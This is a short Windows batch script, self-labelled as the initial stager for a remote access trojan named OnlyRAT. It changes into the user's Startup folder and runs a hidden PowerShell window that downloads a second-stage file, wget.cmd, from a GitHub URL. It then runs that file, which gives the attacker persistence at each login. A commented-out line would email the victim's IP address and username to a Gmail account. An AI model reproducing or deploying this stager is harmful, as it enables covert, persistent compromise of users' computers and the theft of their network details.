@echo off
@REM inital stager for RAT
@REM created by : C0SM0

@REM setup smtp
@REM powershell $email = "example@gmail.com"; $password = "password"; $ip = (Get-NetIPAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress | Out-String; $subject = "OnlyRat: $env:UserName ip"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password); $smtp.Send($email, $email, $subject, $ip);

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup directory
cd %STARTUP%

@REM TODO: build out stage two
@REM write payloads to startup
powershell powershell.exe -windowstyle hidden  "Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/wget.cmd -OutFile wget.cmd"

@REM run payload
powershell ./wget.cmd

@REM cd back into intial location
@REM cd "%INITIALPATH%"
@REM del initial.cmd
